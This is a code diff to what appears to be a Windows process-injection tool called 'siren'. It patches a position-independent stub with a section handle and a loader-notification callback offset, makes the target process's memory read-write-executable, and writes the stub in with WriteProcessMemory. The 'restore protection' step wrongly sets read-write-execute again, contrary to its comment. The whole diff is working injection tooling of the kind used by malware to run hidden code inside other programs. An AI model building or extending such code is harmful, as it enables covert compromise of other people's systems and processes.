@@ -20,6 +20,7 @@
 #include "stub/siren_stub.h"
 #include "notify/ldr_notify.h"  /* siren_ldr_notify_entry */
 
+#include <stdio.h>
 #include <string.h>
 
 /*
@@ -33,13 +34,14 @@ extern const unsigned char siren_stub_code[];
 extern const size_t        siren_stub_code_size;
 
 /*
- * Offset within siren_stub_code where the stub reads the section handle.
- * The stub stores a 64-bit placeholder (0xDEADBEEFCAFEBABE) that we
- * patch to the real HANDLE value before writing into the target.
- *
- * This offset is exported from the assembly file as a symbol.
+ * Two patch offsets exported from the assembly file:
+ *   handle_patch_offset — where the stub reads the section HANDLE value.
+ *     Placeholder 0xDEADBEEFCAFEBABE is replaced with the real HANDLE.
+ *   entry_offset_patch_offset — where the stub reads the byte offset from
+ *     the blob base to the siren_ldr_notify_entry (used by NOP-self logic).
  */
 extern const size_t siren_stub_handle_patch_offset;
+extern const size_t siren_stub_entry_offset_patch_offset;
 
 /* ─── Entry layout matching notify/ldr_notify.h ─────────────────── */
 
@@ -82,15 +84,25 @@ siren_status_t siren_stub_write(HANDLE  hProcess,
     /* Copy PIC stub code. */
     memcpy(blob, siren_stub_code, siren_stub_code_size);
 
-    /* Patch the section handle placeholder inside the stub code. */
+    /* Compute entry offset first (needed for both patching and entry building). */
+    size_t entry_off = entry_offset_calc();
+
+    /* Patch the section handle placeholder. */
     if (siren_stub_handle_patch_offset + sizeof(HANDLE) <=
         siren_stub_code_size) {
         memcpy(blob + siren_stub_handle_patch_offset,
                &section_handle, sizeof(HANDLE));
     }
 
+    /* Patch the entry-offset slot so the stub can find the notify entry
+     * for NOP-self (zeroing entry->Callback after first invocation). */
+    if (siren_stub_entry_offset_patch_offset + sizeof(size_t) <=
+        siren_stub_code_size) {
+        memcpy(blob + siren_stub_entry_offset_patch_offset,
+               &entry_off, sizeof(entry_off));
+    }
+
     /* Build the notify entry at the end of the blob. */
-    size_t entry_off = entry_offset_calc();
     siren_ldr_notify_entry *entry =
         (siren_ldr_notify_entry *)(blob + entry_off);
 
@@ -104,14 +116,33 @@ siren_status_t siren_stub_write(HANDLE  hProcess,
     /* Context = section handle (stub reads this to call NtMapViewOfSection). */
     entry->Context = (PVOID)(ULONG_PTR)section_handle;
 
+    /* ── Make slack pages writable in target ────────────────────── */
+    DWORD old_prot = 0;
+    if (!VirtualProtectEx(hProcess, slack_addr, total,
+                          PAGE_EXECUTE_READWRITE, &old_prot)) {
+        fprintf(stderr, "[siren] VirtualProtectEx failed: Win32 error %lu\n",
+                GetLastError());
+        LocalFree(blob);
+        return SIREN_E_STUB_WRITE;
+    }
+
     /* ── WriteProcessMemory into target's slack ───────────────────── */
     SIZE_T written = 0;
     BOOL ok = WriteProcessMemory(hProcess, slack_addr,
                                  blob, total, &written);
+    DWORD wpm_err = GetLastError();
     LocalFree(blob);
 
-    if (!ok || written != total)
+    /* Restore protection: execute + read so the stub can run */
+    DWORD tmp_prot = 0;
+    VirtualProtectEx(hProcess, slack_addr, total, PAGE_EXECUTE_READWRITE, &tmp_prot);
+
+    if (!ok || written != total) {
+        fprintf(stderr,
+                "[siren] WriteProcessMemory failed: Win32 error %lu"
+                " (wrote %zu / %zu bytes)\n", wpm_err, written, total);
         return SIREN_E_STUB_WRITE;
+    }
 
     return SIREN_OK;
 }
